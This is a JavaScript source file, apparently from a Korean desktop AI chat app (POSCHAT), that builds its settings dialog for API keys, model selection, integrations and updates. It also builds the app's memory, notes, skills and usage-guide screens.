  const anthropicHint = c.anthropic_key_source === "settings" ? "저장된 키가 있습니다. 바꾸려면 새 키를 입력하세요."
    : c.anthropic_key_source === "env" ? "환경 변수 ANTHROPIC_API_KEY의 키를 쓰고 있습니다."
    : "console.anthropic.com → API Keys에서 만든 본인 키(sk-ant-...)를 넣으세요.";
  const anthropicKey = h("input", { type: "password", placeholder: c.anthropic_key_source ? "••••••••••••" : "sk-ant-...",
    autocomplete: "off" });
  const clearAnthropic = h("input", { type: "checkbox", style: "width:auto;margin:0 6px 0 0" });
  const mode = h("select", {},
    h("option", { value: "chat_completions" }, "POSTECH GenAI — OpenAI 호환 API, GPT·Claude·Gemini (권장)"),
    h("option", { value: "anthropic" }, "일반 AI 모델 (Claude) — 내 Claude API 키로 연결"),
    h("option", { value: "openai" }, "일반 AI 모델 (GPT) — 내 OpenAI API 키로 연결"),
    h("option", { value: "responses" }, "POSTECH GenAI — OpenAI Responses API, GPT-5 계열"),
    h("option", { value: "a1" }, "POSTECH GenAI — a1/gpt 단일 호출 (예전 기본값, 모델은 서버가 정함)"),
  );
  mode.value = c.api_mode || "chat_completions";
  const url = h("input", { type: "url", placeholder: "https://.../agent/api/a번호/openai/responses", value: c.responses_url || "" });
  const compatibleUrl = h("input", { type: "url", placeholder: S.defaultChatUrl || "https://.../v1/chat/completions",
    value: c.chat_completions_url || "" });
  const responsesModels = S.responsesModels || [];
  const responsesModel = h("select", {}, responsesModels.map((m) => h("option", { value: m.id }, m.label)));
  const compatibleModel = h("select", {});
  const fillCompatible = (models, selected) => {
    compatibleModel.replaceChildren(...models.map((m) => h("option", { value: m.id }, m.label)));
    compatibleModel.value = models.some((m) => m.id === selected) ? selected : ((models[0] || {}).id || "");
  };
  const defaultModel = c.model || ((S.models || [])[0] || {}).id || "";
  responsesModel.value = responsesModels.some((m) => m.id === defaultModel)
    ? defaultModel : ((responsesModels[0] || {}).id || "");
  fillCompatible(S.models || [], defaultModel);
  const modelsHint = h("small", {}, S.modelsSource === "server"
    ? "서버에서 받은 모델 목록입니다."
    : "기본 목록입니다. 다른 OpenAI 호환 서버를 쓴다면 '모델 목록 불러오기'로 그 서버의 모델로 바꿉니다(POSTECH 서버는 목록을 알려 주지 않습니다).");
  // 불러온 목록은 저장을 눌러야 반영한다(취소하면 버린다). 주소를 다시 고치면 그 목록도 버린다.
  let serverModels = null;
  compatibleUrl.addEventListener("input", () => {
    if (!serverModels) return;
    serverModels = null;
    fillCompatible(S.models || [], compatibleModel.value);
    modelsHint.textContent = "주소를 바꿨으므로 저장하면 기본 목록을 씁니다.";
  });
  const loadModels = h("button", { class: "btn", type: "button", style: "margin-top:8px", onclick: async () => {
    loadModels.disabled = true;
    try {
      const result = await api().refresh_models({ api_key: key.value.trim(), chat_completions_url: compatibleUrl.value.trim() });
      if (result.ok === false) return toast(result.error);
      if (compatibleUrl.value.trim()) compatibleUrl.value = result.chat_completions_url;
      serverModels = result.models.map((m) => m.id);
      fillCompatible(result.models, compatibleModel.value);
      modelsHint.textContent = `서버에서 받은 모델 목록입니다 (${result.models.length}개). 저장하면 반영됩니다.`;
    } catch (error) {
      toast(`모델 목록을 불러오지 못했습니다: ${error.message || error}`);
    } finally {
      loadModels.disabled = false;
    }
  } }, "모델 목록 불러오기");
  // 일반 AI 모델(Claude, 개인 Claude API 키): 모델 목록은 Anthropic이 알려 주는 대로(이 키로 쓸 수 있는 모델). 저장해야 반영한다.
  const claudeModel = h("select", {});
  const fillClaude = (models, selected) => {
    claudeModel.replaceChildren(...models.map((m) => h("option", { value: m.id }, m.label)));
    claudeModel.value = models.some((m) => m.id === selected) ? selected : ((models[0] || {}).id || "");
  };
  fillClaude(S.anthropicModels || [], c.anthropic_model);
  const claudeHint = h("small", {}, S.anthropicModelsSource === "server"
    ? "Anthropic에서 받은 모델 목록입니다." : "기본 목록입니다. '모델 목록 불러오기'로 이 키로 쓸 수 있는 모델을 모두 받아 옵니다.");
  let anthropicModels = null;
  const loadClaude = h("button", { class: "btn", type: "button", style: "margin-top:8px", onclick: async () => {
    loadClaude.disabled = true;
    try {
      const result = await api().refresh_models({ api_mode: "anthropic", anthropic_api_key: anthropicKey.value.trim() });
      if (result.ok === false) return toast(result.error);
      anthropicModels = result.models.map((m) => m.id);
      fillClaude(result.models, claudeModel.value);
      claudeHint.textContent = `Anthropic에서 받은 모델 목록입니다 (${result.models.length}개). 저장하면 반영됩니다.`;
    } catch (error) {
      toast(`모델 목록을 불러오지 못했습니다: ${error.message || error}`);
    } finally {
      loadClaude.disabled = false;
    }
  } }, "모델 목록 불러오기");
  const anthropicBox = h("div", {},
    h("div", { class: "field" }, h("label", {}, "Claude API 키 (Anthropic)"), anthropicKey,
      h("small", {}, anthropicHint, h("br"),
        "요금은 이 키의 Anthropic 계정으로 청구되고 POSTECH 크레딧은 쓰지 않습니다. 키는 이 기기의 사용자 데이터 폴더(config.json)에 저장되며 동기화되지 않습니다."),
      c.anthropic_key_source === "settings"
        ? h("label", { style: "display:flex;align-items:center;font-size:13px;margin-top:4px;cursor:pointer" }, clearAnthropic, "저장된 키 지우기")
        : null),
    h("div", { class: "field" }, h("label", {}, "기본 모델"), claudeModel, claudeHint, loadClaude,
      h("small", {}, "Claude Opus 5.5를 권장합니다. 비용을 줄이려면 Sonnet 5.5나 Haiku 5.5를 고르세요. ",
        "PO노트의 서버 음성 보정과 크레딧 확인은 POSTECH GenAI 키가 있을 때만 씁니다(Claude API는 음성을 받지 않습니다).")),
  );
  // 1.18 일반 AI 모델(GPT, 개인 OpenAI API 키): Claude와 같은 꼴. 모델 목록은 OpenAI가 알려 주는 대로, 저장해야 반영한다.
  const openaiHint = c.openai_key_source === "settings" ? "저장된 키가 있습니다. 바꾸려면 새 키를 입력하세요."
    : c.openai_key_source === "env" ? "환경 변수 OPENAI_API_KEY의 키를 쓰고 있습니다."
    : "platform.openai.com → API keys에서 만든 본인 키(sk-...)를 넣으세요.";
  const openaiKey = h("input", { type: "password", id: "openai-key", placeholder: c.openai_key_source ? "••••••••••••" : "sk-...",
    autocomplete: "off" });
  const clearOpenai = h("input", { type: "checkbox", style: "width:auto;margin:0 6px 0 0" });
  const gptModel = h("select", { id: "openai-model" });
  const fillGpt = (models, selected) => {
    gptModel.replaceChildren(...models.map((m) => h("option", { value: m.id }, m.label)));
    gptModel.value = models.some((m) => m.id === selected) ? selected : ((models[0] || {}).id || "");
  };
  fillGpt(S.openaiModels || [], c.openai_model);
  const gptHint = h("small", {}, S.openaiModelsSource === "server"
    ? "OpenAI에서 받은 모델 목록입니다." : "기본 목록입니다. '모델 목록 불러오기'로 이 키로 쓸 수 있는 모델을 모두 받아 옵니다.");
  let openaiModels = null;
  const loadGpt = h("button", { class: "btn", type: "button", id: "openai-load", style: "margin-top:8px", onclick: async () => {
    loadGpt.disabled = true;
    try {
      const result = await api().refresh_models({ api_mode: "openai", openai_api_key: openaiKey.value.trim() });
      if (result.ok === false) return toast(result.error);
      openaiModels = result.models.map((m) => m.id);
      fillGpt(result.models, gptModel.value);
      gptHint.textContent = `OpenAI에서 받은 모델 목록입니다 (${result.models.length}개). 저장하면 반영됩니다.`;
    } catch (error) {
      toast(`모델 목록을 불러오지 못했습니다: ${error.message || error}`);
    } finally {
      loadGpt.disabled = false;
    }
  } }, "모델 목록 불러오기");
  const openaiBox = h("div", { id: "openai-box" },
    h("div", { class: "field" }, h("label", {}, "OpenAI API 키"), openaiKey,
      h("small", {}, openaiHint, h("br"),
        "요금은 이 키의 OpenAI 계정으로 청구되고 POSTECH 크레딧은 쓰지 않습니다. 키는 이 기기의 사용자 데이터 폴더(config.json)에 저장되며 동기화되지 않습니다."),
      c.openai_key_source === "settings"
        ? h("label", { style: "display:flex;align-items:center;font-size:13px;margin-top:4px;cursor:pointer" }, clearOpenai, "저장된 키 지우기")
        : null),
    h("div", { class: "field" }, h("label", {}, "기본 모델"), gptModel, gptHint, loadGpt,
      h("small", {}, "GPT-5.1을 권장합니다. 비용을 줄이려면 GPT-5 mini를 고르세요. ",
        "PO노트의 서버 음성 보정과 크레딧 확인은 POSTECH GenAI 키가 있을 때만 씁니다.")),
  );
  const stream = h("input", { type: "checkbox", style: "width:auto;margin:0 8px 0 0" });
  stream.checked = c.stream !== false;
  const autoUpdate = h("input", { type: "checkbox", style: "width:auto;margin:0 8px 0 0" });
  autoUpdate.checked = c.update_check !== false;
  const devMode = h("input", { type: "checkbox", style: "width:auto;margin:0 8px 0 0" });
  devMode.checked = !!c.developer_mode;
  // 1.19: 앱을 열 때의 창 크기. 다음 실행부터 적용된다(지금 창은 F11로 전체 화면을 켜고 끌 수 있다).
  const windowMode = h("select", { id: "window-mode" },
    h("option", { value: "normal" }, "기본 창"),
    h("option", { value: "maximized" }, "최대화"),
    h("option", { value: "fullscreen" }, "전체 화면"));
  windowMode.value = c.window_mode || "fullscreen";  // 1.19.1 기본값: 전체 화면
  const responsesBox = h("div", {},
    h("div", { class: "field" }, h("label", {}, "Responses API 주소 (필수)"), url,
      h("small", {}, "필수 입력. POSTECH GenAI 콘솔에서 openai/responses로 끝나는 전체 HTTPS 주소를 복사하세요.")),
    h("div", { class: "field" }, h("label", {}, "모델"), responsesModel,
      h("small", {}, "GPT-5.1을 권장합니다. 에이전트는 단계마다 모델을 부르므로 비용을 줄이려면 GPT-5 mini를 고르세요.")),
  );
  const compatibleBox = h("div", {},
    h("div", { class: "field" }, h("label", {}, "OpenAI 호환 API 주소"), compatibleUrl,
      h("small", {}, "비워 두면 POSTECH GenAI 콘솔(에이전트 API → OpenAI Compatible API)의 주소를 씁니다. ",
        "다른 서버를 쓸 때만 넣으세요. 기본 주소(Base URL, 예: .../v1)만 넣어도 /chat/completions를 자동으로 붙입니다.")),
    h("div", { class: "field" }, h("label", {}, "기본 모델"), compatibleModel, modelsHint, loadModels,
      h("small", {}, "새 대화의 기본 모델입니다. 기존 대화의 모델은 대화 상단에서 개별 선택하며 각각 저장됩니다.")),
  );
  const postechLabel = h("label", {}, "POSTECH GenAI API 키");
  const postechField = h("div", { class: "field" }, postechLabel, key,
    h("small", {}, keyHint, h("br"), "키는 이 PC의 사용자 데이터 폴더(config.json)에 저장됩니다. ",
      "일반 AI 모델(Claude·GPT)을 쓸 때도 PO노트 서버 음성 보정·크레딧 확인에 쓰므로 있으면 넣어 두세요(선택)."));
  const syncMode = () => {
    // Claude·GPT 방식에서는 그 키를 먼저 보이고, POSTECH 키는 선택 항목으로 그 아래에 둔다
    const own = mode.value === "anthropic" || mode.value === "openai";
    postechLabel.textContent = own ? "POSTECH GenAI API 키 (선택)" : "POSTECH GenAI API 키";
    if (mode.value === "anthropic") anthropicBox.after(postechField);
    else if (mode.value === "openai") openaiBox.after(postechField);
    else if (mode.parentNode) mode.parentNode.after(postechField);
    responsesBox.hidden = mode.value !== "responses";
    compatibleBox.hidden = mode.value !== "chat_completions";
    anthropicBox.hidden = mode.value !== "anthropic";
    openaiBox.hidden = mode.value !== "openai";
    url.required = mode.value === "responses";
  };
  mode.addEventListener("change", syncMode);
  syncMode();  // 칸 보이기·숨기기. 칸 순서는 body를 만든 뒤 한 번 더 부를 때 맞춘다
  const body = h("div", {},
    // 1.19: 사용법 가이드를 설정 맨 위의 큰 카드로(제목만 보고도 찾을 수 있게)
    h("button", { class: "guide-card", type: "button", onclick: showGuide, "aria-label": "사용법 가이드 열기" },
      h("span", { class: "guide-card-icon", "aria-hidden": "true", html: ICONS.book }),
      h("span", { class: "guide-card-text" },
        h("b", {}, "사용법 가이드"),
        h("span", {}, "처음 쓰거나 기능이 궁금하면 여기서 시작하세요. 채팅·에이전트·PO노트·브라우저·코드·Lab 사용법을 정리해 두었습니다.")),
      h("span", { class: "guide-card-go", "aria-hidden": "true" }, "열기 →")),
    h("div", { class: "field" }, h("label", {}, "API 방식"), mode),
    postechField,
    responsesBox,
    compatibleBox,
    anthropicBox,
    openaiBox,
    window.adaptiveSettingsField ? adaptiveSettingsField() : null,
    h("div", { class: "field" },
      h("label", { style: "display:flex;align-items:center;font-weight:600;cursor:pointer" }, stream, "답변을 받는 대로 표시 (스트리밍)"),
      h("small", {}, "일반 대화의 답변을 글자가 오는 대로 보여 줍니다. 에이전트 모드의 단계 진행은 그대로입니다.")),
    h("div", { class: "field" }, h("label", {}, "Notion 통합 토큰"), notion,
      h("small", {}, notionHint, " notion.so/profile/integrations에서 내부 통합을 만들어 토큰을 받고, ",
        "쓸 페이지의 ··· → 연결에서 그 통합을 추가하세요."),
      c.notion_source === "settings"
        ? h("label", { style: "display:flex;align-items:center;font-size:13px;margin-top:4px;cursor:pointer" }, clearNotion, "저장된 토큰 지우기")
        : null),
    h("div", { class: "field" }, h("label", {}, "Firecrawl API 키"), firecrawl,
      h("small", {}, fcHint, " firecrawl.dev에서 무료로 가입하면 키와 무료 크레딧을 받습니다."),
      c.firecrawl_source === "settings"
        ? h("label", { style: "display:flex;align-items:center;font-size:13px;margin-top:4px;cursor:pointer" }, clearFirecrawl, "저장된 키 지우기")
        : null),
    h("div", { class: "field" }, h("label", {}, "PLMS 계정 (자동 로그인, 베타)"), plmsUser, plmsPass,
      h("small", {}, c.plms_username ? "저장된 계정이 있습니다. 바꾸려면 새 아이디·비밀번호를 입력하세요. " : "",
        "PLMS → SSO 로그인을 누르면 로그인 창에 자동으로 입력합니다. StonePASS 같은 2단계 인증은 직접 진행해야 합니다. ",
        "비밀번호는 이 PC의 보안 저장소(Windows 자격 증명 관리자·macOS 키체인)에만 저장하며, AI·대화 기록·동기화로 보내지 않습니다."),
      c.plms_username
        ? h("label", { style: "display:flex;align-items:center;font-size:13px;margin-top:4px;cursor:pointer" }, clearPlms, "저장된 계정 지우기")
        : null),
    h("div", { class: "field" }, h("label", { for: "window-mode" }, "시작할 때 창 크기"), windowMode,
      h("small", {}, "다음에 앱을 열 때부터 이 크기로 엽니다. 지금 창은 F11로 전체 화면을 켜고 끌 수 있습니다.")),
    h("div", { class: "field" }, h("label", {}, "업데이트"),
      h("label", { style: "display:flex;align-items:center;font-weight:400;cursor:pointer" }, autoUpdate, "시작할 때 새 버전 확인"),
      h("div", { class: "row", style: "margin-top:6px" },
        h("small", { style: "flex:1;margin:0" }, `지금 버전 ${S.version}. 새 버전은 업데이트 서버에서 받아 설치합니다.`),
        h("button", { class: "btn", type: "button", onclick: async (e) => {
          e.target.disabled = true;
          try {
            const result = await api().check_for_updates(true);
            if (result.available) offerUpdate(result);
            else toast(result.error || `최신 버전(${S.version})을 쓰고 있습니다`);
          } finally {
            e.target.disabled = false;
          }
        } }, "업데이트 확인"))),
    h("div", { class: "row guide-link" },
      h("span", { style: "flex:1" }, "GitHub·Google·Zotero 연결, MCP 서버, 메모리·동기화, 사용량·진단은 '연결·도구' 창에서 관리합니다. 연구 라이브러리와 에이전트 자동화는 왼쪽 사이드바에서 엽니다."),
      h("button", { class: "btn", type: "button", onclick: () => showHub() }, "연결·도구 열기")),
    h("div", { class: "field" }, h("label", {}, "에이전트 권한"), perm,
      h("small", {}, "에이전트가 파일을 고치거나 명령을 실행하기 전에 승인을 받을지 정합니다. 메일 전송·리뷰 제출·삭제·코드 실행은 이 설정과 관계없이 매번 묻습니다.")),
    h("div", { class: "row" },
      h("div", { class: "field", style: "flex:1" }, h("label", {}, "기억할 이전 메시지 수"), hist),
      h("div", { class: "field", style: "flex:1" }, h("label", {}, "에이전트 최대 단계 수"), steps)),
    h("div", { class: "field" }, h("label", {}, "POSTECH GenAI 크레딧"), creditLine(),
      h("small", {}, "POSTECH GenAI가 응답에 담아 주는 이 키의 크레딧 사용량과 한도입니다. 확인 자체는 크레딧을 쓰지 않습니다. ",
        "Claude Sonnet 5.5 기준 1크레딧은 입력 약 250토큰·출력 약 75토큰이고, 호출마다 기본 약 24크레딧이 듭니다(Opus는 두 배).")),
    h("div", { class: "field" }, h("label", {}, "모델 API 사용량 (이 앱에서 보낸 요청)"),
      usageBox,
      h("small", {}, "토큰 수는 서버가 응답에 사용량을 담아 준 요청만 셉니다.")),
    h("div", { class: "field" }, h("label", {}, "개발자 모드"),
      h("label", { style: "display:flex;align-items:center;font-weight:400;cursor:pointer" }, devMode, "라우팅·토큰·손익분기 원자료 보기"),
      h("small", {}, "답변 아래 모델 표시를 펼치면 호출마다 서버가 알려 준 실제 토큰(캐시 포함)·손익분기 계산·원본 JSON이 보이고, ",
        "연결·도구 → 사용량·진단에 Adaptive AI 개발자 데이터(최근 기록·토큰 합계·손익분기 표)가 생깁니다. 질문·답 내용은 기록하지 않습니다.")),
    h("div", { class: "field" }, h("label", {}, "데이터 폴더"),
      h("div", { class: "row" }, h("small", { style: "flex:1;margin:0;word-break:break-all" }, S.dataDir),
        h("button", { class: "btn", onclick: () => api().open_folder("data") }, "열기"))),
  );
  body.append(h("p", { style: "margin:14px 0 0;color:var(--text-3);font-size:12px" }, `POSCHAT 버전 ${S.version}`),
    h("p", { style: "margin:2px 0 0;color:var(--text-3);font-size:12px" }, "서비스 대표자: 김범준"),
    h("p", { style: "margin:2px 0 0;color:var(--text-3);font-size:12px" }, "문의사항은 ",
      h("a", { href: "https://pidstech.com", target: "_blank", style: "color:inherit" }, "PIDS Tech. 홈페이지"), "의 문의 메일로 보내 주세요."),
    licenseBlock());
  syncMode();
  modal({
    title: "설정",
    body,
    buttons: [
      { label: "취소", value: null },
      {
        label: "저장", class: "primary", action: async (close) => {
          if (mode.value === "responses" && !url.value.trim()) {
            url.focus();
            return toast("Responses API 주소를 입력하세요.");
          }
          if (mode.value === "anthropic" && !anthropicKey.value.trim()
              && (!c.anthropic_key_source || clearAnthropic.checked)) {
            anthropicKey.focus();
            return toast("일반 AI 모델(Claude)을 쓰려면 Claude API 키를 입력하세요.");
          }
          if (mode.value === "openai" && !openaiKey.value.trim()
              && (!c.openai_key_source || clearOpenai.checked)) {
            openaiKey.focus();
            return toast("일반 AI 모델(GPT)을 쓰려면 OpenAI API 키를 입력하세요.");
          }
          const state = await api().save_settings({
            api_key: key.value.trim(), history_messages: hist.value, max_steps: steps.value, permission: perm.value,
            api_mode: mode.value, responses_url: url.value.trim(),
            chat_completions_url: compatibleUrl.value.trim(), server_models: serverModels,
            model: mode.value === "responses" ? responsesModel.value
              : mode.value === "anthropic" ? claudeModel.value : mode.value === "openai" ? gptModel.value : compatibleModel.value,
            stream: stream.checked,
            anthropic_api_key: anthropicKey.value.trim(), anthropic_server_models: anthropicModels,
            clear_anthropic_key: clearAnthropic.checked && !anthropicKey.value.trim(),
            openai_api_key: openaiKey.value.trim(), openai_server_models: openaiModels,
            clear_openai_key: clearOpenai.checked && !openaiKey.value.trim(),
            update_check: autoUpdate.checked, developer_mode: devMode.checked, window_mode: windowMode.value,
            notion_token: notion.value.trim(), clear_notion: clearNotion.checked && !notion.value.trim(),
            firecrawl_key: firecrawl.value.trim(), clear_firecrawl: clearFirecrawl.checked && !firecrawl.value.trim(),
            plms_username: plmsUser.value.trim(), plms_password: plmsPass.value, clear_plms: clearPlms.checked,
          });
          if (state.ok === false) return toast(state.error);
          applyState(state);
          close();
          toast("설정을 저장했습니다");
        },
      },
    ],
  });
  setTimeout(() => (mode.value === "anthropic" ? anthropicKey : mode.value === "openai" ? openaiKey : key).focus(), 50);
}

/* ---------- 업데이트 ---------- */
const UPD = { modal: null, bar: null, text: null };

function offerUpdate(update, attempts = 0) {
  // 다른 창(설정 등)이 열려 있으면 닫힐 때까지 기다렸다가 연다
  if ($("#modal-root .modal") && !$("#modal-root .modal .update-notes")) {
    if (attempts < 120) setTimeout(() => offerUpdate(update, attempts + 1), 500);
    return;
  }
  const body = h("div", {},
    h("p", { style: "margin:0 0 10px" }, `새 버전 ${update.version}을 쓸 수 있습니다. 지금 버전은 ${update.current || S.version}입니다.`),
    update.notes ? h("div", { class: "update-notes" }, renderMarkdown(update.notes)) : null,
    h("small", { style: "display:block;margin-top:10px;color:var(--text-3)" },
      update.store ? "Microsoft Store로 설치한 앱입니다. Store의 다운로드 및 업데이트(또는 POSCHAT 페이지)에서 업데이트하세요. " +
        "새 버전은 Store 심사(보통 1~2일)를 거친 뒤 Store에 보입니다. 대화·설정은 그대로 남습니다."
        : update.can_install ? "업데이트 서버에서 설치 파일을 받아 크기·SHA-256·서명을 확인한 뒤 설치를 시작합니다. 대화·설정은 그대로 남습니다."
          : "이 기기에서는 자동으로 설치할 수 없습니다. 업데이트 서버 페이지에서 받아 설치하세요."));
  modal({
    title: "업데이트",
    body,
    buttons: [
      { label: "이 버전 건너뛰기", action: (close) => { api().skip_update(update.version); close(); } },
      { label: "나중에", value: null },
      update.store
        ? { label: "Microsoft Store 열기", class: "primary", action: async (close) => {
          const r = await api().open_store_updates(); if (r && r.ok === false) toast(r.error); close(); } }
        : update.can_install
          ? { label: "업데이트", class: "primary", action: (close) => { close(); startUpdate(update); } }
          : { label: "다운로드 페이지 열기", class: "primary", action: (close) => { api().open_release_page(); close(); } },
    ],
  });
}

async function startUpdate(update) {
  UPD.bar = h("i", { style: "width:0%" });
  UPD.text = h("p", { style: "margin:0 0 10px;color:var(--text-2)" }, `${update.version} 설치 파일을 내려받는 중…`);
  UPD.modal = modal({ title: "업데이트", body: h("div", {}, UPD.text, h("div", { class: "po-meter po-progress" }, UPD.bar)),
    onClose: () => { UPD.modal = null; } });
  const res = await api().download_update();
  if (res.ok === false) {
    UPD.modal?.close();
    toast(res.error);
  }
}

function updateEvent(ev) {
  if (ev.kind === "progress") {
    if (UPD.bar) UPD.bar.style.width = `${Math.round(ev.done / ev.total * 100)}%`;
    if (UPD.text) UPD.text.textContent = `설치 파일을 내려받는 중… ${fmtSize(ev.done)} / ${fmtSize(ev.total)}`;
  } else if (ev.kind === "installing" || ev.kind === "opened") {
    if (UPD.text) UPD.text.textContent = ev.message;
    if (UPD.bar) UPD.bar.style.width = "100%";
    if (ev.kind === "opened") setTimeout(() => UPD.modal?.close(), 6000);
  } else if (ev.kind === "error") {
    UPD.modal?.close();
    toast(`업데이트하지 못했습니다: ${ev.error}`);
  }
}

function showMemory() {
  const list = h("div", {});
  const render = () => {
    list.innerHTML = "";
    if (!S.memory.length) {
      list.append(h("p", { style: "color:var(--text-3);margin:6px 0" }, "아직 기억한 내용이 없습니다."));
    }
    for (const m of S.memory) {
      list.append(h("div", { class: "skill-item" },
        h("div", { class: "s-main" }, h("p", { style: "margin:0;color:var(--text)" }, m.text)),
        h("button", {
          class: "icon-btn", title: "지우기", html: ICONS.trash,
          onclick: async () => { S.memory = await api().delete_memory(m.id); render(); },
        }),
      ));
    }
  };
  render();
  const input = h("input", { placeholder: "예: 답변은 항상 존댓말로, 핵심부터 짧게" });
  const add = async () => {
    if (!input.value.trim()) return;
    const res = await api().add_memory(input.value.trim());
    S.memory = res.memory;
    input.value = "";
    render();
  };
  input.addEventListener("keydown", (e) => { if (e.key === "Enter" && !e.isComposing) add(); });
  const share = h("input", { type: "checkbox", style: "width:auto;margin:0 8px 0 0" });
  share.checked = S.config.share_threads !== false;
  share.addEventListener("change", async () => {
    applyState(await api().save_settings({ share_threads: share.checked }));
    toast(share.checked ? "다른 대화 참고를 켰습니다" : "다른 대화 참고를 껐습니다");
  });
  const body = h("div", {},
    h("p", { style: "margin:0 0 8px;color:var(--text-2)" },
      "여기 있는 내용은 모든 대화에 함께 전달됩니다. 대화 중에 \"~를 기억해 줘\", \"잊지 마\"라고 하면 자동으로 추가되고, /remember 내용 으로도 추가할 수 있습니다."),
    list,
    h("div", { class: "field" }, h("label", {}, "새로 기억할 내용"),
      h("div", { class: "row" }, input, h("button", { class: "btn primary", onclick: add }, "추가"))),
    h("div", { class: "field" },
      h("label", { style: "display:flex;align-items:center;font-weight:600;cursor:pointer" }, share, "다른 대화 내용 참고"),
      h("small", {}, "새 질문과 관련된 내용이 다른 대화에 있으면 찾아서 함께 참고합니다. 참고한 대화는 답변 위에 📎로 표시됩니다. ",
        "에이전트 모드에서는 \"지난번에 얘기한 ...\"처럼 말하면 다른 대화를 직접 검색합니다.")),
  );
  const m = modal({
    title: "메모리",
    body,
    buttons: [
      { label: "memory.md 편집", action: () => { m.close(); showNoteEditor("memory"); } },
      { label: "닫기", class: "primary" },
    ],
  });
  setTimeout(() => input.focus(), 50);
}

/* memory.md·USER.md를 앱 안에서 고친다. 휴대폰에서도 같은 방법으로 고칠 수 있다. */
const NOTES = {
  memory: {
    title: "메모리 (memory.md)",
    desc: "\"- \"로 시작하는 줄 하나가 기억 하나입니다. 제목이나 설명을 더 써도 모두 대화에 전달되고, <!-- --> 안의 안내문만 빠집니다.",
  },
  profile: {
    title: "내 정보 (USER.md)",
    desc: "나에 대한 정보입니다. 모든 대화에 함께 전달되어 답변을 나에게 맞추는 데 쓰입니다. " +
      "직접 쓰거나, 아래 'AI로 작성·업데이트'를 누르면 지금까지의 대화를 바탕으로 AI가 정리합니다(/user).",
  },
};

async function showNoteEditor(kind) {
  const note = await api().read_note(kind);
  const info = NOTES[kind];
  const area = h("textarea", { class: "note-editor", spellcheck: "false" });
  area.value = note.text;
  const body = h("div", {},
    h("p", { style: "margin:0 0 8px;color:var(--text-2)" }, info.desc),
    area,
    h("small", { style: "display:block;margin-top:6px;color:var(--text-3);word-break:break-all" }, note.path));
  const save = async () => {
    const res = await api().save_note(kind, area.value);
    S.memory = res.memory;
    toast("저장했습니다");
  };
  const buttons = [{ label: "파일 열기", action: async () => { await save(); api().open_note(kind); } }];
  if (kind === "profile") {
    buttons.push({
      label: "AI로 작성·업데이트", action: async (close) => {
        if (area.value !== note.text) await save();
        close();
        if (S.busy) return toast("이전 응답을 기다리는 중입니다");
        const input = $("#input");
        const draft = input.value;  // 쓰던 글은 /user를 보낸 뒤 되돌려 놓는다
        input.value = "/user";
        await send();
        input.value = draft;
        autoresize();
        updateSend();
      },
    });
  }
  buttons.push({ label: "취소", value: null });
  buttons.push({ label: "저장", class: "primary", action: async (close) => { await save(); close(); } });
  modal({ title: info.title, body, wide: true, buttons });
  setTimeout(() => { area.focus(); area.setSelectionRange(0, 0); area.scrollTop = 0; }, 50);
}

function showSkills() {
  const list = h("div", {});
  const render = () => {
    list.innerHTML = "";
    if (!S.skills.length) list.append(h("p", { style: "color:var(--text-3)" }, "등록된 스킬이 없습니다."));
    for (const s of S.skills) {
      list.append(h("div", { class: "skill-item", title: s.path },
        h("div", { class: "s-main" }, h("b", {}, "/" + s.name), h("span", { class: "badge" }, s.source),
          // 1.19.1: 플러그인 스킬은 플러그인 화면처럼 한국어 설명을 보이고 영문 원문은 접어 둔다
          s.description_ko ? h("p", {}, s.description_ko) : h("p", {}, s.description),
          s.description_ko && s.description ? h("details", { class: "plugin-orig" }, h("summary", {}, "영문 원문"),
            h("p", { lang: "en" }, s.description)) : null),
        h("button", { class: "btn", onclick: () => { m.close(); $("#input").value = `/${s.name} `; updateSend(); $("#input").focus(); } }, "사용"),
      ));
    }
  };
  render();
  const name = h("input", { placeholder: "새 스킬 이름 (예: meeting-notes)" });
  const body = h("div", {},
    h("p", { style: "margin:0 0 8px;color:var(--text-2)" },
      "스킬은 SKILL.md 지침 파일입니다. 에이전트가 요청에 맞는 스킬을 스스로 불러오고, /스킬이름 으로 직접 실행할 수도 있습니다."),
    list,
    h("div", { class: "field" }, h("label", {}, "새 스킬 만들기"),
      h("div", { class: "row" }, name, h("button", {
        class: "btn primary", onclick: async () => {
          if (!name.value.trim()) return;
          const res = await api().create_skill(name.value.trim());
          if (!res.ok) return toast(res.error);
          S.skills = res.skills;
          name.value = "";
          render();
          toast("SKILL.md 템플릿을 열었습니다. 내용을 채워 저장하세요");
        },
      }, "만들기")),
      h("small", {}, "사용자 스킬 폴더에 템플릿이 만들어지고 메모장 등으로 열립니다. 작업 폴더의 skills\\ 폴더에 둔 스킬은 그 폴더에서만 쓰입니다.")),
  );
  const m = modal({
    title: "스킬",
    body,
    buttons: [
      { label: "스킬 폴더 열기", action: () => api().open_folder("skills") },
      { label: "닫기", class: "primary", value: null },
    ],
  });
}

function showMcp() {
  return showHub("mcp");  // 1.10: MCP 목록은 '연결·도구' 창의 한 탭이다(web/hub.js)
}

/* ---------- 사용법 가이드 (설정 → 사용법 가이드) ---------- */
const GUIDE = [
  ["처음 시작하기", `
1. **설정 → POSTECH GenAI API 키**에 본인의 키를 넣고 저장합니다. 본인 Claude API 키로 쓰려면 **API 방식 → 일반 AI 모델 (Claude)**를 고르고 Claude API 키를 넣습니다.
2. 입력창에 질문을 쓰고 **Enter**로 보냅니다(줄바꿈은 Shift+Enter).
3. 파일을 다루게 하려면 왼쪽 아래 **작업 폴더**를 고르고 오른쪽 위 **에이전트** 스위치를 켭니다.

새 대화는 왼쪽 위 **새 채팅**(Ctrl+Shift+O, 맥은 ⌘+Shift+O)으로 만들고, 대화 목록에 마우스를 올리면 이름 바꾸기·삭제 아이콘이 나옵니다.

앱을 열 때 창 크기는 **설정 → 시작할 때 창 크기**(기본 창·최대화·전체 화면)에서 정합니다. 지금 창은 **F11**로 전체 화면을 켜고 끕니다.`],
  ["모델과 API 방식", `
**설정 → API 방식**에서 고릅니다.

- **OpenAI 호환 API (권장, 기본)**: 주소를 비워 두면 POSTECH GenAI 콘솔의 OpenAI Compatible API 주소를 씁니다. GPT·Claude·Gemini 모델을 고릅니다.
- **OpenAI Responses API**: 콘솔의 \`.../a번호/openai/responses\` 주소를 넣고 GPT-5 계열 모델을 고릅니다.
- **a1/gpt 단일 호출**: 예전 기본값입니다. 모델은 서버가 정합니다.
